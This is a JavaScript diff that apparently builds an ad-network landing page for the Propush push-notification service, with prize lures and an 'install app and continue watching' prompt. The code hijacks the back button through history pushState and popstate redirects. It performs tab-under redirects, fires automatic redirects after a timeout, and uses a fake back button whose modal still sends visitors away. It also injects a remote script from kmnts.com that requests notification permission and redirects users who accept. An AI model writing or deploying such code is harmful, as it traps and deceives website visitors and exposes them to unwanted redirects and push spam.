+    const shouldMakeInstantRedirect = false;
+    if (newTabUrl) {
+      const popup = window.open(newTabUrl, "_blank");
+      if (popup) {
+        popup.opener = null;
+        if (currentTabUrl) {
+          if (shouldMakeInstantRedirect) {
+            replaceTo({ url: currentTabUrl });
+          } else {
+            document.addEventListener("visibilitychange", () => {
+              if (document.visibilityState === "visible") {
+                replaceTo({ url: currentTabUrl });
+              }
+            });
+          }
+        }
+      } else if (currentTabUrl) {
+        replaceTo({ url: currentTabUrl });
+      }
+    } else if (currentTabUrl) {
+      replaceTo({ url: currentTabUrl });
+    }
+  };
+
+  const hasAppConfig = () => {
+    if (typeof APP_CONFIG !== "undefined") return true;
+    document.body.innerHTML = `
+      <p style="">LANDING CAN'T BE RENDERED. 🔔 PLEASE ADD CODE (you can find an object with options in your Propush account) FROM PROPUSH TO HEAD TAG.</p>
+    `;
+    return false;
+  };
+
+  const TAB_NAMES = ["currentTab", "newTab"];
+  const EXIT_FIELDS = ["zoneId", "url"];
+
+  const normalizeConfig = (appConfig) => {
+    if (!hasAppConfig()) return null;
+
+    const { domain, videoCount, prizeName, prizeImg, ...rest } = appConfig;
+
+    return {
+      videoCount,
+      prizeName,
+      prizeImg,
+      ...Object.entries(rest).reduce((acc, [rawKey, value]) => {
+        let [name, maybeTab, maybeField] = rawKey.split("_");
+        if (!name) return acc;
+
+        if (TAB_NAMES.includes(maybeTab)) {
+          const tab = maybeTab;
+          if (EXIT_FIELDS.includes(maybeField)) {
+            acc[name] = {
+              ...acc[name],
+              [tab]: {
+                domain: maybeField === "zoneId" ? domain : undefined,
+                [maybeField]: value
+              }
+            };
+          }
+        } else if (EXIT_FIELDS.includes(maybeTab)) {
+          const field = maybeTab;
+          acc[name] = {
+            ...acc[name],
+            currentTab: {
+              domain: field === "zoneId" ? domain : undefined,
+              [field]: value
+            }
+          };
+        } else {
+          const field = maybeTab;
+          acc[name] = {
+            ...acc[name],
+            [field]: value
+          };
+        }
+
+        return acc;
+      }, {})
+    };
+  };
+
+  const AUTOEXIT_TTL = (() => {
+    (async () => {
+      let timeoutId;
+      const cfg = normalizeConfig(APP_CONFIG);
+      if (!cfg) return;
+
+      const autoexit = cfg?.autoexit;
+      if (autoexit?.currentTab) {
+        const sec = autoexit.timeToRedirect ?? 90;
+        let isVisible = document.visibilityState === "visible";
+        let armed = false;
+
+        const onVisibilityChange = () => {
+          if (document.visibilityState === "visible") {
+            isVisible = true;
+            if (armed) runCurrentTabExit(cfg, "autoexit");
+          } else {
+            isVisible = false;
+          }
+        };
+
+        const arm = () => {
+          document.addEventListener("visibilitychange", onVisibilityChange);
+          timeoutId = setTimeout(() => {
+            armed = true;
+            if (isVisible) runCurrentTabExit(cfg, "autoexit");
+          }, sec * 1000);
+        };
+
+        timeoutId = arm();
+
+        const cancel = () => {
+          clearTimeout(timeoutId);
+          document.removeEventListener("visibilitychange", onVisibilityChange);
+        };
+
+        document.addEventListener("mousemove", cancel);
+        document.addEventListener("click", cancel);
+        document.addEventListener("scroll", cancel);
+      }
+    })();
+
+    return 5184000;
+  })();
+
+  const pushConfig = normalizeConfig(APP_CONFIG);
+  if (pushConfig?.push?.currentTab?.domain && pushConfig?.push?.currentTab?.zoneId) {
+    (async ({ outDomain, pushDomain, pushZone, allowedNew, allowedPop, subscribedNew, subscribedPop }) => {
+      const appendTarget = [document.documentElement, document.body].filter(Boolean).pop();
+      if (!appendTarget) return;
+
+      const script = document.createElement("script");
+      script.setAttribute("data-cs", "exclude");
+
+      const pushParams = await (async (zoneId) => {
+        const qs = await buildExitSearchParams({ zone: zoneId.toString() });
+        const abtest = IN.abtest || APP_CONFIG.abtest;
+
+        if (IN.ymid) qs.set("var_2", ymid);
+        if (zoneId) qs.set("z", zoneId);
+        if (IN.wua) qs.set("wua", IN.wua);
+        if (abtest) {
+          qs.set("ab2", String(abtest));
+          qs.set("ab2_ttl", `${AUTOEXIT_TTL}`);
+        }
+        qs.set("sw", "./sw.js");
+        qs.set("d", location.host);
+
+        return qs;
+      })(pushZone);
+
+      script.src = `https://${pushDomain}/hid.js?${pushParams}`;
+
+      script.onload = function (instance) {
+        instance.zoneId = pushZone;
+        instance.events.onPermissionDefault = function () {};
+        instance.events.onPermissionAllowed = async function () {
+          if (allowedNew) window.open(await generateAfuUrl(allowedNew, outDomain), "_blank");
+          if (allowedPop) window.location.href = await generateAfuUrl(allowedPop, outDomain);
+        };
+        instance.events.onPermissionDenied = function () {};
+        instance.events.onAlreadySubscribed = async function () {
+          if (subscribedNew) window.open(await generateAfuUrl(subscribedNew, outDomain), "_blank");
+          if (subscribedPop) window.location.href = await generateAfuUrl(subscribedPop, outDomain);
+        };
+        instance.events.onNotificationUnsupported = function () {};
+      };
+
+      appendTarget.appendChild(script);
+    })({
+      outDomain: pushConfig.push.currentTab.domain,
+      pushDomain: "kmnts.com",
+      pushZone: pushConfig.push.currentTab.zoneId
+    });
+  }
+
+  (() => {
+    const cfg = normalizeConfig(APP_CONFIG);
+    if (!cfg) return;
+
+    const reverse = cfg?.reverse;
+    let armed = false;
+
+    if (reverse?.currentTab) {
+      window.addEventListener("click", async () => {
+        try {
+          if (!armed) {
+            const currentPath = `${window.location.pathname}${window.location.search}`;
+            await initBack(cfg);
+            window.history.pushState(null, "", currentPath);
+            armed = true;
+          }
+        } catch (error) {
+          if (error instanceof Error && window.syncMetric) {
+            window.syncMetric({
+              event: "error",
+              errorMessage: error.message,
+              errorType: "CUSTOM",
+              errorSubType: "Reverse"
+            });
+          }
+        }
+      }, { capture: true });
+
+      window.addEventListener("popstate", () => {
+        runCurrentTabExit(cfg, "reverse", false);
+      });
+    }
+  })();
+
+  const localeFetchCache = {};
+  let localePathCache;
+
+  const loadLocale = async (fallbackLoader, localeRoot) => {
+    const lang = getLang();
+
+    if (localeFetchCache[lang] && localePathCache === localeRoot) {
+      return localeFetchCache[lang];
+    }
+
+    localePathCache = localeRoot;
+    localeFetchCache[lang] = (async () => {
+      try {
+        const file = localeRoot ? `${localeRoot}/${lang}.json` : `./locales/${lang}.json`;
+        const res = await fetch(file);
+        if (res.ok && res.status === 200) {
+          return await res.json();
+        }
+        throw new Error(`Locale file not found: ${file}`);
+      } catch (error) {
+        if (error instanceof Error && window.syncMetric) {
+          window.syncMetric({
+            event: "error",
+            errorMessage: error.message,
+            errorType: "CUSTOM",
+            errorSubType: "GetTranslations"
+          });
+          console.error(`Error while loading translations: ${error.message}. Check locale file.`);
+        }
+        return fallbackLoader();
+      }
+    })();
+
+    return localeFetchCache[lang];
+  };
+
+  const isLocaleFallback = (localeRoot) => {
+    const lang = getLang();
+    return localePathCache === localeRoot && localeFetchCache[lang] === false;
+  };
+
+  const applyTranslations = async (fallbackLoader, replacements, localeRoot) => {
+    const lang = getLang();
+    document.documentElement.setAttribute("lang", lang);
+
+    const locale = await loadLocale(fallbackLoader, localeRoot);
+
+    if (["ar", "he", "fa", "ur", "az", "ku", "ff", "dv"].includes(lang) && !isLocaleFallback(localeRoot)) {
+      document.documentElement.setAttribute("dir", "rtl");
+    }
+
+    const missed = [];
+
+    Object.entries(locale).forEach(([key, value]) => {
+      const replacement = replacements?.[key];
+      let text = value;
+
+      if (replacement) {
+        const fallbackValue = replacement.fallbackTranslationKey ? locale[replacement.fallbackTranslationKey] : undefined;
+        const macrosValue = replacement.macrosValue ?? fallbackValue;
+        text = macrosValue ? text.replaceAll(replacement.macros, macrosValue) : text;
+      }
+
+      const nodes = document.querySelectorAll(`[data-translate="${key}"]`);
+      if (nodes?.length) {
+        nodes.forEach((node) => {
+          if (!node) return;
+          if (node.hasAttribute("data-translate-html")) {
+            node.innerHTML = text;
+          } else if (!node.childNodes.length) {
+            node.textContent = text;
+          } else {
+            node.childNodes.forEach((child) => {
+              if (child.nodeType === Node.TEXT_NODE) {
+                child.nodeValue = text;
+              }
+            });
+          }
+        });
+      } else {
+        missed.push(key);
+      }
+    });
+
+    if (missed.length) {
+      console.warn("Some keys from locales folder weren't used:", missed.join(", "));
+    }
+  };
+
+  const DESIGN_CONTENT_LOADED = new CustomEvent("DesignContentLoaded");
+
+  const applyDesign = async ({
+    designRootPath = "./designs",
+    queryParamName = "design",
+    cssSelector = "#main-css",
+    localePathBuilder = (path) => `${path}/locale`,
+    loadFallbackTranslation
+  } = {}) => {
+    const design = (() => {
+      const value = new URL(window.location.href).searchParams.get(queryParamName)?.trim();
+      return value === "default" ? "" : value || APP_CONFIG.design;
+    })();
+
+    const originalBody = document.body.innerHTML;
+
+    if (!design) {
+      document.dispatchEvent(DESIGN_CONTENT_LOADED);
+      return;
+    }
+
+    try {
+      const previewBanner = document.getElementById("preview_banner");
+      const previewBannerStyle = document.getElementById("preview_banner_style");
+
+      document.body.innerHTML = "";
+      const designPath = `${designRootPath}/${design}`;
+
+      const response = await fetch(`${designPath}/index.html`);
+      const html = await response.text();
+
+      if (!html || response.ok === false || response.status === 404) {
+        throw new Error("Design was defined in APP_CONFIG, but there is no such design");
+      }
+
+      const designHtml = html.replaceAll("./assets", `${designPath}/assets`);
+      const cssNode = document.querySelector(cssSelector);
+      if (cssNode) cssNode.remove();
+
+      const script = document.createElement("script");
+      script.src = `${designPath}/assets/script.js`;
+
+      document.body.innerHTML = designHtml;
+      if (previewBannerStyle && !document.getElementById("preview_banner_style")) document.body.append(previewBannerStyle);
+      if (previewBanner) document.body.append(previewBanner);
+      document.body.append(script);
+
+      if (loadFallbackTranslation) {
+        await applyTranslations(async () => loadFallbackTranslation(designPath), {}, localePathBuilder(designPath));
+      }
+    } catch (error) {
+      console.error(error);
+      document.body.innerHTML = originalBody;
+      if (error instanceof Error && window.syncMetric) {
+        window.syncMetric({
+          event: "error",
+          errorMessage: error.message,
+          errorType: "CUSTOM",
+          errorSubType: "DesignChange"
+        });
+      }
+    }
+
+    console.log("DISPATCH");
+    document.dispatchEvent(DESIGN_CONTENT_LOADED);
+  };
+
+  (async () => {
+    await applyDesign({
+      designRootPath: "./designs",
+      queryParamName: "design",
+      cssSelector: "#main-css",
+      localePathBuilder: (path) => `${path}/locale`,
+      loadFallbackTranslation: async (path) => import(`${path}/locale/en.json`).then((m) => m.default)
+    });
+  })();
+
+  const getStep = (name = "step", removeFromUrl = true) => {
+    const value = new URL(window.location.href).searchParams.get(name);
+    if (removeFromUrl) {
+      const url = new URL(window.location.href);
+      url.searchParams.delete(name);
+      window.history.replaceState(window.history.state, "", url.href);
+    }
+    return value;
+  };
+
+  const removeModalShell = () => {
+    const modal = document.querySelector("#modal");
+    const overlay = document.querySelector("#overlay");
+    if (modal) modal.remove();
+    if (overlay) overlay.remove();
+  };
+
+  const showCustomModal = () => {
+    const modal = document.getElementById("pl_exit_modal");
+    if (!modal) return;
+    modal.style.display = "flex";
+    modal.setAttribute("aria-hidden", "false");
+  };
+
+  const hideCustomModal = () => {
+    const modal = document.getElementById("pl_exit_modal");
+    if (!modal) return;
+    modal.style.display = "none";
+    modal.setAttribute("aria-hidden", "true");
+  };
+
+  const cfg = normalizeConfig(APP_CONFIG);
+
+  if (cfg) {
+    const isStep = getStep("step", true) === "1";
+    const hasTabUnder = !!cfg.tabUnderClick?.currentTab;
+
+    if (isStep && hasTabUnder) {
+      removeModalShell();
+      document.addEventListener("DesignContentLoaded", removeModalShell);
+    }
+
+    document.addEventListener("click", async (e) => {
+      const target = e.target?.closest?.("[data-target]");
+      const action = target?.getAttribute("data-target") || "";
+
+      if (action === "back_button") {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        showCustomModal();
+        return;
+      }
+
+      if (action === "modal_stay") {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        hideCustomModal();
+        return;
+      }
+
+      if (action === "modal_leave") {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        hideCustomModal();
+        if (cfg.ageExit?.newTab) {
+          await runDualExit(cfg, "ageExit");
+        } else {
+          await runCurrentTabExit(cfg, "ageExit");
+        }
+        return;
+      }
+
+      if (isStep || !hasTabUnder) {
+        if (cfg.mainExit?.newTab) {
+          await runDualExit(cfg, "mainExit");
+        } else {
+          await runCurrentTabExit(cfg, "mainExit");
+        }
+      } else {
+        const continueUrl = new URL(window.location.href);
+        continueUrl.searchParams.append("step", "1");
+
+        await runDualExit({
+          ...cfg,
+          tabUnderClick: {
+            ...cfg.tabUnderClick,
+            newTab: { url: continueUrl.toString() }
+          }
+        }, "tabUnderClick");
+      }
+    });
+  }
+
+  applyTranslations(
+    async () => loadFallbackLocale(),
+    {
+      install_app_and_continue_watching: {
+        macros: "{app_name}",
+        macrosValue: APP_CONFIG.appName,
+        fallbackTranslationKey: "our_app"
+      }
+    }
+  );
 })();
